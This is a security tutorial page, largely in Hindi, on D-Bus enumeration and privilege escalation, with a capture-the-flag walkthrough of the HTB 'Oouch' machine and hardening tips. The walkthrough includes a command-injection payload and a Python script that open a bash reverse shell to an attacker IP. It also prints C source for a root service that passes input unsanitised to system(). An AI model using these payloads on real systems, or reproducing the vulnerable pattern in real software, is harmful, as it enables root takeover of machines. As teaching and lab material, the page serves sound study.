# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus का उपयोग Ubuntu desktop environments में inter-process communications (IPC) mediator के रूप में किया जाता है। Ubuntu पर कई message buses का concurrent operation देखा जाता है: system bus, जिसका मुख्य रूप से **privileged services द्वारा पूरे system से संबंधित services expose करने के लिए** उपयोग किया जाता है, और प्रत्येक logged-in user के लिए एक session bus, जो केवल उस specific user से संबंधित services expose करता है। यहां मुख्य focus system bus पर है, क्योंकि इसका संबंध higher privileges (जैसे root) के साथ चलने वाली services से है और हमारा उद्देश्य privileges elevate करना है। यह ध्यान देने योग्य है कि D-Bus की architecture प्रत्येक session bus के लिए एक 'router' का उपयोग करती है, जो clients द्वारा उस service के लिए निर्दिष्ट address के आधार पर client messages को उपयुक्त services पर redirect करने के लिए जिम्मेदार होता है, जिससे वे communicate करना चाहते हैं।<sup>[[1]](#references)</sup>

D-Bus पर services उनके द्वारा expose किए जाने वाले **objects** और **interfaces** से defined होती हैं। Objects की तुलना standard OOP languages में class instances से की जा सकती है, जहां प्रत्येक instance को एक **object path** द्वारा uniquely identify किया जाता है। यह path, filesystem path के समान, service द्वारा expose किए गए प्रत्येक object को uniquely identify करता है। Research purposes के लिए एक key interface **org.freedesktop.DBus.Introspectable** interface है, जिसमें एक singular method, Introspect, शामिल है। यह method object के supported methods, signals और properties का XML representation return करता है; यहां focus methods पर है और properties तथा signals को omit किया गया है।

D-Bus interface के साथ communication के लिए दो tools का उपयोग किया गया: **gdbus** नामक एक CLI tool, जो scripts में D-Bus द्वारा expose किए गए methods को आसानी से invoke करने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), जो Python-based GUI tool है और प्रत्येक bus पर उपलब्ध services को enumerate करने तथा प्रत्येक service के भीतर मौजूद objects को display करने के लिए design किया गया है।
```bash
sudo apt-get install d-feet
```
यदि आप **session bus** की जाँच कर रहे हैं, तो पहले वर्तमान address की पुष्टि करें:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

पहली image में D-Bus system bus के साथ registered services दिखाई गई हैं, जिसमें System Bus button चुनने के बाद विशेष रूप से **org.debin.apt** को highlight किया गया है। D-Feet objects के लिए इस service को query करता है और चुने गए objects के लिए interfaces, methods, properties और signals दिखाता है, जैसा कि दूसरी image में देखा जा सकता है। प्रत्येक method का signature भी विस्तार से दिखाया जाता है।

एक महत्वपूर्ण feature service का **process ID (pid)** और **command line** दिखाना है, जो यह पुष्टि करने में उपयोगी है कि service elevated privileges के साथ चल रही है या नहीं। यह research relevance के लिए महत्वपूर्ण है।

**D-Feet method invocation की भी अनुमति देता है**: users parameters के रूप में Python expressions input कर सकते हैं, जिन्हें D-Feet service को भेजने से पहले D-Bus types में convert कर देता है।

हालांकि, ध्यान दें कि **कुछ methods को invoke करने की अनुमति देने से पहले authentication की आवश्यकता होती है**। हम इन methods को ignore करेंगे, क्योंकि हमारा लक्ष्य शुरुआत से ही credentials के बिना अपने privileges को elevate करना है।

यह भी ध्यान दें कि कुछ services किसी user को कुछ actions करने की अनुमति दी जानी चाहिए या नहीं, यह निर्धारित करने के लिए org.freedeskto.PolicyKit1 नामक किसी अन्य D-Bus service को query करती हैं।

## **Cmd line Enumeration**

### List Service Objects

Opened D-Bus interfaces को इस command से list करना संभव है:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** के रूप में चिह्नित Services विशेष रूप से महत्वपूर्ण हैं, क्योंकि वे **अभी चल नहीं रही हैं**, लेकिन bus request उन्हें आवश्यकता पड़ने पर शुरू कर सकती है। `busctl list` पर न रुकें; उन नामों को उन वास्तविक binaries से map करें जिन्हें वे execute करेंगी।
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
यह आपको तुरंत बताता है कि किसी activatable name के लिए कौन-सा `Exec=` path शुरू होगा और किस identity के अंतर्गत। यदि binary या उसकी execution chain कमजोर रूप से सुरक्षित है, तो inactive service भी privilege-escalation path बन सकती है।

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) जब कोई process किसी bus से connection स्थापित करता है, तो bus उस connection को एक विशेष bus name प्रदान करता है, जिसे _unique connection name_ कहा जाता है। इस प्रकार के bus names अपरिवर्तनीय होते हैं—यह सुनिश्चित होता है कि connection के मौजूद रहने तक वे नहीं बदलेंगे—और इससे भी महत्वपूर्ण बात यह है कि bus के lifetime के दौरान उनका दोबारा उपयोग नहीं किया जा सकता। इसका अर्थ है कि उस bus से कोई अन्य connection कभी भी ऐसा unique connection name प्राप्त नहीं करेगा, भले ही वही process bus से connection बंद करके नया connection बनाए। Unique connection names को आसानी से पहचाना जा सकता है, क्योंकि वे उस colon character से शुरू होते हैं जो अन्यथा निषिद्ध है।<sup>[[4]](#references)</sup>

### Service Object Info

इसके बाद, आप इस command से interface के बारे में कुछ information प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Bus name को उसके `systemd` unit और executable path के साथ भी correlate करें:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
यह उस operational प्रश्न का उत्तर देता है जो privesc के दौरान महत्वपूर्ण होता है: **यदि कोई method call सफल होता है, तो कौन-सा वास्तविक binary और unit यह action करेगा?**

### Service Object के Interfaces की सूची बनाएं

आपके पास पर्याप्त permissions होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Service Object के Interface का Introspect करें

ध्यान दें कि इस उदाहरण में `tree` parameter का उपयोग करके खोजे गए latest interface को चुना गया था (_पिछला section देखें_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
interface `htb.oouch.Block` के method `.Block` पर ध्यान दें (यही वह है जिसमें हमारी रुचि है)। अन्य columns में मौजूद "s" का अर्थ हो सकता है कि यह किसी string की अपेक्षा कर रहा है।

किसी खतरनाक चीज़ को आज़माने से पहले, पहले किसी **read-oriented** या अन्य low-risk method को validate करें। इससे तीन मामलों को स्पष्ट रूप से अलग किया जा सकता है: गलत syntax, reachable लेकिन denied, या reachable और allowed।
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods को Policies और Actions के साथ Correlate करें

Introspection आपको बताता है कि आप **क्या** call कर सकते हैं, लेकिन यह नहीं बताता कि कोई call **क्यों** allowed या denied है। वास्तविक privesc triage के लिए आपको आमतौर पर **तीनों layers को एक साथ** inspect करना होता है:

1. **Activation metadata** (`.service` files या `SystemdService=`) से पता करें कि वास्तव में कौन-सा binary और unit run होगा।
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) से पता करें कि कौन `own`, `send_destination` या `receive_sender` कर सकता है।
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) से default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) पता करें।

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method और Polkit action के बीच 1:1 mapping मानकर न चलें। वही method, modify किए जा रहे object या runtime context के आधार पर अलग action चुन सकती है। इसलिए व्यावहारिक workflow यह है:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` और संबंधित `.policy` files में grep करें
3. `busctl call`, `gdbus call`, या `dbusmap --enable-probes --null-agent` के साथ low-risk live probes

Proxy या compatibility services पर विशेष ध्यान दें। एक **root-running proxy**, जो अपने पहले से स्थापित connection के माध्यम से requests को किसी अन्य D-Bus service को forward करता है, अनजाने में backend को हर request UID 0 से आती हुई मानने पर मजबूर कर सकता है, जब तक कि original caller identity को फिर से validate न किया जाए।<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

पर्याप्त privileges के साथ (`send_destination` और `receive_sender` privileges अकेले पर्याप्त नहीं हैं), आप **D-Bus communication को monitor** कर सकते हैं।

किसी **communication को monitor** करने के लिए आपको **root** होना आवश्यक है। यदि root होने पर भी समस्याएँ मिलती हैं, तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) देखें।

> [!WARNING]
> यदि आप जानते हैं कि non-root users को communication sniff करने की अनुमति देने के लिए D-Bus config file को कैसे configure किया जाता है, तो कृपया **मुझसे संपर्क करें**!

monitor करने के अलग-अलग तरीके:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
निम्नलिखित उदाहरण में interface `htb.oouch.Block` को monitor किया जाता है और **"**_**lalalalal**_**" message miscommunication के माध्यम से भेजा जाता है**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
आप परिणामों को **pcapng** फ़ाइल में सहेजने के लिए `monitor` के बजाय `capture` का उपयोग कर सकते हैं, जिसे Wireshark खोल सकता है:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### सारा noise फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

यदि bus पर बहुत अधिक information हो, तो इस तरह एक match rule पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
कई rules निर्दिष्ट किए जा सकते हैं। यदि कोई message _किसी भी_ rule से match करता है, तो message print किया जाएगा। इस प्रकार:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
अधिक जानकारी के लिए [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) में match rule syntax देखें।<sup>[[7]](#references)</sup>

### अधिक

`busctl` में और भी अधिक options हैं, [**उन सभी को यहाँ देखें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **Vulnerable Scenario**

HTB के host "oouch" के अंदर user **qtc** के रूप में आपको _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित एक **unexpected D-Bus config file** मिल सकती है:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
पिछले configuration से ध्यान दें कि इस D-BUS communication के माध्यम से information भेजने और प्राप्त करने के लिए **user `root` या `www-data` होना आवश्यक है**।

Docker container **aeb4525789d8** के अंदर user **qtc** के रूप में आप file _/code/oouch/routes.py_ में कुछ dbus से संबंधित code पा सकते हैं। यह relevant code है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **D-Bus interface से connect हो रहा है** और **"Block" function** को "client_ip" भेज रहा है।

D-Bus connection के दूसरी ओर कोई C compiled binary चल रही है। यह code D-Bus connection में **IP address के लिए listening कर रहा है और दिए गए IP address को block करने के लिए `system` function के माध्यम से iptables call कर रहा है**।\
**`system` को call करना जानबूझकर command injection के लिए vulnerable है**, इसलिए निम्न payload जैसा payload reverse shell बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### इसे exploit करें

इस page के अंत में आपको **D-Bus application का complete C code** मिल सकता है। इसके अंदर lines 91-97 के बीच आप देख सकते हैं कि **`D-Bus object path`** और **`interface name`** कैसे **registered** किए गए हैं। D-Bus connection को information भेजने के लिए यह information आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
साथ ही, line 57 में आप देख सकते हैं कि **इस D-Bus communication के लिए registered एकमात्र method** का नाम `Block` है (_**इसीलिए अगले section में payloads को service object `htb.oouch.Block`, interface `/htb/oouch/Block` और method name `Block` पर भेजा जाएगा**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित python code payload को `Block` method के माध्यम से D-Bus connection पर `block_iface.Block(runme)` द्वारा भेजेगा (_ध्यान दें कि इसे code के पिछले chunk से extract किया गया था_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` एक tool है जिसका उपयोग “Message Bus” को message भेजने के लिए किया जाता है।
- Message Bus – यह एक software है जिसका उपयोग systems द्वारा applications के बीच communication को आसान बनाने के लिए किया जाता है। यह Message Queue से संबंधित है (जिसमें messages sequence में ordered होते हैं), लेकिन Message Bus में messages subscription model में भेजे जाते हैं और यह बहुत तेज़ भी होता है।
- “-system” tag का उपयोग यह बताने के लिए किया जाता है कि यह system message है, session message नहीं (by default)।
- “–print-reply” tag का उपयोग हमारे message को उचित रूप से print करने और किसी भी reply को human-readable format में प्राप्त करने के लिए किया जाता है।
- “–dest=Dbus-Interface-Block” Dbus interface का address है।
- “–string:” – यह उस message का type है जिसे हम interface को भेजना चाहते हैं। Messages भेजने के कई formats होते हैं, जैसे double, bytes, booleans, int, objpath। इनमें “object path” तब उपयोगी होता है जब हम Dbus interface को किसी file का path भेजना चाहते हैं। इस स्थिति में हम एक special file (FIFO) का उपयोग करके file के नाम में interface को कोई command pass कर सकते हैं। “string:;” – इसका उपयोग object path को दोबारा call करने के लिए किया जाता है, जहाँ हम FIFO reverse shell file/command रखते हैं।

_Note करें कि `htb.oouch.Block.Block` में पहला भाग (`htb.oouch.Block`) service object को reference करता है और अंतिम भाग (`.Block`) method name को reference करता है।_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

बड़े D-Bus attack surface की `busctl`/`gdbus` के साथ manual enumeration जल्दी ही कठिन हो जाती है। पिछले कुछ वर्षों में जारी किए गए दो छोटे FOSS utilities red-team या CTF engagements के दौरान काम को तेज कर सकते हैं:

### dbusmap ("Nmap for D-Bus")
* लेखक: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C में लिखा गया है; एक single static binary (<50 kB), जो हर object path पर चलता है, `Introspect` XML प्राप्त करता है और उसे owning PID/UID से map करता है।<sup>[[5]](#references)</sup>
* उपयोगी flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* यह tool unprotected well-known names को `!` से चिह्नित करता है, जिससे तुरंत ऐसे services दिखाई देते हैं जिन्हें आप *own* (take over) कर सकते हैं या ऐसे method calls, जिन्हें unprivileged shell से reach किया जा सकता है।

### uptux.py
* लेखक: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* यह केवल Python पर आधारित script है, जो systemd units में *writable* paths और अत्यधिक permissive D-Bus policy files (जैसे `send_destination="*"`) खोजती है।<sup>[[6]](#references)</sup>
* त्वरित उपयोग:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module नीचे दिए गए directories को search करता है और ऐसे सभी services को highlight करता है जिन्हें normal user spoof या hijack कर सकता है:
* `/etc/dbus-1/system.d/` और `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## उल्लेखनीय D-Bus Privilege-Escalation Bugs (2024-2025)

हाल ही में प्रकाशित CVEs पर नज़र रखने से custom code में मौजूद समान insecure patterns को पहचानने में मदद मिलती है। हाल के दो अच्छे examples हैं:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root के रूप में चलने वाली service ने एक D-Bus interface expose किया था, जिसे unprivileged users reconfigure कर सकते थे; इसमें attacker-controlled macro behavior लोड करना भी शामिल था। | यदि कोई daemon system bus पर **device/profile/config management** expose करता है, तो writable configuration और macro features को केवल "settings" नहीं, बल्कि code-execution primitives मानें। |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root के रूप में चलने वाला compatibility proxy requests को backend services तक original caller का security context सुरक्षित रखे बिना forward करता था, इसलिए backends proxy को UID 0 के रूप में trust करते थे। | **proxy / bridge / compatibility** D-Bus services को एक अलग bug class मानें: यदि वे privileged calls relay करते हैं, तो जाँचें कि caller UID/Polkit context backend तक किस प्रकार पहुँचता है। |

ध्यान देने योग्य patterns:
1. Service **system bus पर root के रूप में** चलती है।
2. या तो **authorization check नहीं होता**, या check **गलत subject** के विरुद्ध किया जाता है।
3. Reachable method अंततः system state में बदलाव करता है: package install, user/group changes, bootloader config, device profile updates, file writes या direct command execution।

किसी method के reachable होने की पुष्टि करने के लिए `dbusmap --enable-probes` या manual `busctl call` का उपयोग करें। इसके बाद service की policy XML और Polkit actions की जाँच करें, ताकि समझ सकें कि वास्तव में **किस subject** को authorize किया जा रहा है।

---

## Hardening & Detection Quick-Wins

* world-writable या *send/receive*-open policies खोजें:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* dangerous methods के लिए Polkit अनिवार्य करें – यहाँ तक कि *root* proxies को भी अपने PID के बजाय *caller* PID को `polkit_authority_check_authorization_sync()` में pass करना चाहिए।
* लंबे समय तक चलने वाले helpers में privileges drop करें (bus से connect करने के बाद namespaces बदलने के लिए `sd_pid_get_owner_uid()` का उपयोग करें)।
* यदि किसी service को हटाना संभव न हो, तो कम-से-कम उसे एक dedicated Unix group तक *scope* करें और उसकी XML policy में access restrict करें।
* Blue-team: system bus को `busctl capture > /var/log/dbus_$(date +%F).pcapng` से capture करें और anomaly detection के लिए उसे Wireshark में import करें।

---

## References

- [1] [Ubuntu Desktop में USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service किसी भी unprivileged user को configuration की अनुमति देती है](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service में Authentication Bypass (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
